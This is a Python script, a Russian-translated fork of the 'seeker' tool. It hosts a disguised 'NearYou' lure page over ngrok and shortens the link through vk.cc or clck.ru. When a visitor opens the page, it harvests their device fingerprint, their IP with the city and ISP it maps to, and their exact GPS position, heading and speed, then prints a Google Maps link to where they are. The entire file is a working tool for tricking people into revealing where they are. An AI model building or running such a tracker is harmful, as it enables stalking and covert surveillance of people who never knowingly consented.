import os
import csv
import sys
import time
import json
import requests
import subprocess as subp
import vk_api
from config import ngrok_token, vk_login, vk_password
from pyngrok import ngrok

row = []
site = ''
info = ''
result = ''
version = '1.2.1.3'
OSList = 0
shortener = 0
api = ''
shortener_output = ''

def banner():
	global ngrok_token
	os.system('clear')
	print (
	r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/        ''' +'\n' )
	print('[>] Создатель: thewhiteh4t')
	print('[>] Перевод и модификация: Phelifar\n')
	print('[>] Версия: ' + version + '\n')
	if ngrok_token == None:
		print('[-] Вы не ввели токен ngrok \n')

def ver_check():
	print('[+] Проверка обновлений.....', end='')
	ver_url = 'https://raw.githubusercontent.com/Phelifaar/seeker/master/version.txt'
	ver_rqst = requests.get(ver_url)
	ver_sc = ver_rqst.status_code
	if ver_sc == 200:
		github_ver = ver_rqst.text
		github_ver = github_ver.strip()

		if version == github_ver:
			print('[Новейший]\n')
		else:
			print('[Последняя версия: {}'.format(github_ver) + ']\n')
	else:
		print('[Статус: {}'.format(ver_sc) + ']\n')

def os_select():
	global OSList
	print('[+] Выберите ОС:')
	print('[1] Linux, Termux')
	print('[2] Windows 10')
	OSList = int(input('[>] '))

def shortener_select():
	global shortener
	print('\n[+] Выберите сократитель:')
	print('[1] vk.cc')
	print('[2] clck.ru')
	shortener = int(input('[>] '))

def template_select():
	global site, info, result
	print('\n[+] Выберите вид Seeker:')
	print('[1] NearYou')
	selected = int(input('[>] '))

	if selected == 1:
		site = 'nearyou'
		print('\n' + '[+] Загрузка NearYou...')
	else:
		print('[-] Неверный ввод, принимаются только цифры\n')

	info = 'template/{}/php/info.txt'.format(site)
	result = 'template/{}/php/result.txt'.format(site)

def server():
	global site
	print('\n' + '[+] Запуск PHP Сервера......', end='')
	subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)])
	time.sleep(3)
	try:
		php_sc = requests.get('http://0.0.0.0:8080/index.html').status_code
		if php_sc == 200:
			print('[Успех]')
		else:
			print('[Статус: {}'.format(php_sc) + ']')
	except requests.ConnectionError:
		print('[Неудача]')
		Quit()
	public_url = ngrok.connect(8080, proto='http')
	print('\n' + '[>] Полная ссылка: ' + public_url)
	if shortener == 1:
		if vk_login != None and vk_password != None:
			vk = vk_api.VkApi(vk_login, vk_password)
			vk.auth()
			shortener_output = vk.get_api().utils.getShortLink(url=public_url, private=1)
			print('[>] Сокращённая ссылка: ' + shortener_output['short_url'] + '\n')
		else:
			print(R + '[-] Логин и пароль от ВК не введены\n')
			Quit()
	elif shortener == 2:
		print('[>] Сокращённая ссылка: ' + requests.get('https://clck.ru/--?url=' + public_url).text + '\n')

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n[+] Ожидаются действия пользователя...\n')
			printed = True
		if size > 0:
			main()

def main():
	global info, result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:

				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Нет данных'
				var_ram = value['ram']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform)
				row.append(var_cores)
				row.append(var_ram)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print('[+] Информация устройства:\n')
				print('[+] ОС         : ' + var_os)
				print('[+] Платформа  : ' + var_platform)
				print('[+] Кол-го ядер: ' + var_cores)
				print('[+] RAM        : ' + var_ram)
				print('[+] GPU        : ' + var_render)
				print('[+] Разрешение : ' + var_res)
				print('[+] Браузер    : ' + var_browser)
				print('[+] IP         : ' + var_ip)

				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code

				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_isp = str(data['isp'])

					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_isp)

					print('[+] Страна     : ' + var_country)
					print('[+] Регион     : ' + var_region)
					print('[+] Город      : ' + var_city)
					print('[+] Провайдер  : ' + var_isp)
	except ValueError:
		pass

	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Нет данных'
				else:
					var_alt == value['alt'] + ' m'

				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Нет данных'
				else:
					var_dir = value['dir'] + ' deg'

				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Нет данных'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n[+] Информация местоположения:\n')
				print ('[+] Широта      : ' + var_lat)
				print ('[+] Долгота     : ' + var_lon)
				print ('[+] Точность    : ' + var_acc)
				print ('[+] Высота      : ' + var_alt)
				print ('[+] Направление : ' + var_dir)
				print ('[+] Скорость    : ' + var_spd)
	except ValueError:
		error = file
		print ('\n' + '[-] Данные не получены')
		repeat()

	print ('\n[+] Google Maps.................: https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))

	repeat()

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	if(OSList == 1):
		os.system('pkill php')
	elif(OSList == 2):
		os.system("taskkill /IM php.exe /f")
	exit()

try:
	banner()
	ver_check()
	os_select()
	shortener_select()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	Quit()
